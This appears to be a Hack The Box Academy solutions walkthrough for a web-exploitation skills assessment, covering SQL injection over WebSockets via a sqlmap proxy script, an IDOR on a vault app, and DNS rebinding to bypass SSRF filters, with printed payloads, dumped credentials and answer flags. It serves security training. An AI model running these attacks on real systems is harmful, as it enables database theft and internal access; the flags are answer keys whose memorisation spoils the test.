Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' -T secretdata --dump --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-0ptxut4w0g]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' -T secretdata --dump --threads=10
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: db
Table: secretdata
[1 entry]
+---------------------------------------+
| secretdata                            |
+---------------------------------------+
| HTB{1251ef9b34342f62db6044190f5b83cd} |
+---------------------------------------+
<SNIP>
```

Answer: `HTB{1251ef9b34342f62db6044190f5b83cd}`

# Skills Assessment

## Question 1

### "What is the flag value obtained from the Library web application?"

After spawning the target machine, students first need to add the in-scope subdomains of `Inlanefreight's` to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP library.inlanefreight.local vault.inlanefreight.local webmin.inlanefreight.local pdf.inlanefreight.local" >> /etc/hosts'
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.164 library.inlanefreight.local vault.inlanefreight.local webmin.inlanefreight.local pdf.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to open `Burp`, turn `Intercept` off, open the integrated browser, and navigate to `library.inlanefreight.local:8001`:

![[HTB Solutions/CWEE/z. images/eee9c192b6b61fa06efbb442941a27fd_MD5.jpg]]

When searching if a user has any messages, students will notice that `Burp` shows WebSocket connections:

![[HTB Solutions/CWEE/z. images/4dd7438a97120266736b7d3ba256a08b_MD5.jpg]]

The web application sends the username via the JSON parameter "username" to the `/dbconnector` endpoint:

![[HTB Solutions/CWEE/z. images/5315ecaa766fcc5c8e379f625687671b_MD5.jpg]]

The backend suffers from SQLi, and because the web application is using WebSockets, students need to utilize a `sqlmap` middleware to proxy SQLi payloads through it:

Code: python

```python
from flask import Flask, request
from websocket import create_connection
import json

app = Flask(__name__)

# Make sure to replace STMIP
WS_URL = 'ws://library.inlanefreight.local:8001/dbconnector'

@app.route('/')
def index():
    req = {}
    req['username'] = request.args.get('username', '')

    ws = create_connection(WS_URL)
    ws.send(json.dumps(req))
    r = json.loads(ws.recv())
    ws.close()

    if r.get('error'):
        return r['error']

    return r['messages']

app.run(host='127.0.0.1', port=8000)
```

After saving it into a file, students need to run it:

Code: shell

```shell
python3 sqlmapMiddleware.py
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ python3 sqlmapMiddleware.py

 * Serving Flask app 'sqlmapMiddleware' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:8000/ (Press CTRL+C to quit)
```

Subsequently, students need to run `sqlmap`, making sure to use the `--prefix` option and the value `"` for it:

Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --batch --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --batch --threads=10
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

sqlmap identified the following injection point(s) with a total of 1350 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=htb-stdnt" AND 9488=9488-- yhMj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=htb-stdnt" AND (SELECT 9265 FROM (SELECT(SLEEP(5)))KwNt)-- RNJt
---
<SNIP>
```

Now that `sqlmap` confirmed the SQLi vulnerability, students need to dump the databases' names, finding `db`:

Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --dbs --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --dbs --threads=10
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

available databases [3]:
[*] db
[*] information_schema
[*] performance_schema

<SNIP>
```

Subsequently, students need to enumerate the table names of the `db` database, finding `flag` and `users`:

Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --tables -D db --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --tables -D db --threads=10
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: db
[2 tables]
+-------+
| flag  |
| users |
+-------+

<SNIP>
```

When dumping the `flag` table, students will attain the flag `HTB{1251ef9b34342f62db6044190f5b83cd}`:

Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' -T flag --dump --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' -T flag --dump --threads=10
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: db
Table: flag
[1 entry]
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| HTB{1251ef9b34342f62db6044190f5b83cd} |
+---------------------------------------+

<SNIP>
```

Answer: `HTB{1251ef9b34342f62db6044190f5b83cd}`

# Skills Assessment

## Question 2

### "What is the password for the htb-stdnt user?"

Using the same `sqlmap` middleware from the previous question, students need to use `sqlmap` to dump the `users` table to attain the password `HTB_@cad3my_Stdnt!` for the user `htb-stdnt`:

Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' -T users --dump --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' -T users --dump --threads=10
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: db
Table: users
[2 entries]
+----+---------------------+--------------------+-----------+
| id | message             | password           | username  |
+----+---------------------+--------------------+-----------+
| 1  | Administrator User  | admin              | admin     |
| 2  |  HTB Staff User     | HTB_@cad3my_Stdnt! | htb-stdnt |
+----+---------------------+--------------------+-----------+

<SNIP>
```

Answer: `HTB_@cad3my_Stdnt!`

# Skills Assessment

## Question 3

### "What is the password for the admin user of the Vault web application?"

Using the previously harvested credentials `htb-stdnt:HTB_@cad3my_Stdnt!`, students need to navigate to `vault.inlanefreight.local:8002` and sign in:

![[HTB Solutions/CWEE/z. images/cd90cd55285fc34c1e9884c305827a47_MD5.jpg]]

When hovering over "My Vault", students will notice that the web application uses the URL parameter `id` to request a user's password vault; this makes it a potential candidate for IDOR attacks:

![[HTB Solutions/CWEE/z. images/f19cd15c76c93cb53b57770613751b3d_MD5.jpg]]

The web application suffers from a second-order IDOR attack. To exploit it, students need to intercept the request and change the value of `id` to 1, which belongs to the `admin` user:

![[HTB Solutions/CWEE/z. images/6f31cb32be1df4d1d1d576c948efa23e_MD5.jpg]]

Instead of following the redirection, students can refresh the `/display_data.php` webpage to attain the password `AdM1N@v@uL1` for the `admin`'s Webmin service:

![[HTB Solutions/CWEE/z. images/c06e47a256457aa963e33ae95e3d6fc9_MD5.jpg]]

Answer: `AdM1N@v@uL1`

# Skills Assessment

## Question 4

### "What is the flag value at the /flag endpoint of the PDF web application?"

When navigating to `pdf.inlanefreight.local:8003` and attempting to read the flag from the `/flag` endpoint on `127.0.0.1:8003`, students will notice that the web application implements SSRF filters and prevents private IP addresses:

![[HTB Solutions/CWEE/z. images/a38c8e60b29693169cfc45065b50f97c_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/a7afddda12898092177f71e1ab27e8e3_MD5.jpg]]

However, the web application is vulnerable to DNS rebinding.

From the previous question, students have harvested the credentials `admin:AdM1N@v@uL1` for the Webmin service; therefore, they need to navigate to `webmin.inlanefreight.local:10000` and sign in:

![[HTB Solutions/CWEE/z. images/0a75e0163eaaa762793445b0af9943b1_MD5.jpg]]

Subsequently, students need to navigate to `Networking` ---> `Network Configuration` ---> `Hostname and DNS Client`:

![[HTB Solutions/CWEE/z. images/487cc21477ee9d7f7b084a0fea100dde_MD5.jpg]]

For the `DNS servers` field under `DNS Client Options`, students need to set its value to be that of the interface `tun0`:

```shell
ip -o -4 a show tun0 | cut -d " " -f 7
```
```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ ip -o -4 a show tun0 | cut -d " " -f 7

10.10.15.119/23
```

![[HTB Solutions/CWEE/z. images/0389cea069463ec63758b9e0c1faa92a_MD5.jpg]]

Afterward, students need to install [DNSrebinder](https://github.com/mogwailabs/DNSrebinder.git) to be able to perform the DNS rebinding attack:

```shell
git clone https://github.com/mogwailabs/DNSrebinder.git
cd DNSrebinder/
python3 -m venv DNSrebinder
source DNSrebinder/bin/activate
pip3 install -r requirements.txt
```
```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~]
└──╼ [★]$ git clone https://github.com/mogwailabs/DNSrebinder.git
cd DNSrebinder/
python3 -m venv DNSrebinder
source DNSrebinder/bin/activate
pip3 install -r requirements.txt
<SNIP>
```

Using `dnsrebinder.py`, students need to start a DNS server and make it resolve a domain name (`google.com` used here) to `1.1.1.1` for the first request and then to `127.0.0.1` for any subsequent ones:

```shell
sudo python3 dnsrebinder.py --domain google.com --ip 1.1.1.1 --rebind 127.0.0.1 --counter 1 --tcp --udp
```
```shell
(DNSrebinder) ┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-r0xvavhkst]─[~/DNSrebinder]
└──╼ [★]$ sudo python3 dnsrebinder.py --domain google.com --ip 1.1.1.1 --rebind 127.0.0.1 --counter 1 --tcp --udp

Starting nameserver...
UDP server loop running in thread: Thread-1
TCP server loop running in thread: Thread-2
```

With the rogue DNS server running, students need to visit `pdf.inlanefreight.local:8003` and "search" for a URL that uses the domain name supplied to `dnsrebinder.py`, followed by the application's port number 8003 and the `/flag` path:

![[HTB Solutions/CWEE/z. images/ed714f5155872f8ad127842dd4499cce_MD5.jpg]]

Because the web application resolves the domain twice, the first DNS `A` record will map `google.com` to `1.1.1.1`, while the second maps it to `127.0.0.1`; students can view the output of `dnsrebinder.py` to view the `A` records the fake DNS server replies with:

```shell
(DNSrebinder) ┌─[eu-academy-1]─[10.10.15.119]─[htb-ac-413848@htb-uecxkmkmay]─[~/DNSrebinder]
└──╼ [★]$ sudo python3 dnsrebinder.py --domain google.com --ip 1.1.1.1 --rebind 127.0.0.1 --counter 1 --tcp --udp

Starting nameserver...
UDP server loop running in thread: Thread-1
TCP server loop running in thread: Thread-2
Got a request for google.com. Type: A
------------------------ Counter for host  google.com.   1
---- Reply:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33058
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;google.com.                    IN      A
;; ANSWER SECTION:
google.com.             0       IN      A       1.1.1.1
Got a request for google.com. Type: A
------------------------ Counter for host  google.com.   2
---- Reply:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27453
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;google.com.                    IN      A
;; ANSWER SECTION:
google.com.             0       IN      A       127.0.0.1
```

Students will attain the flag `HTB{994c44577021f06eadcc1fe43c9ca49f}` in the generated PDF file of `http://127.0.0.1:8003/flag`:

![[HTB Solutions/CWEE/z. images/a455301ae65856220359e9eebe7e5527_MD5.jpg]]

Answer: `HTB{994c44577021f06eadcc1fe43c9ca49f}`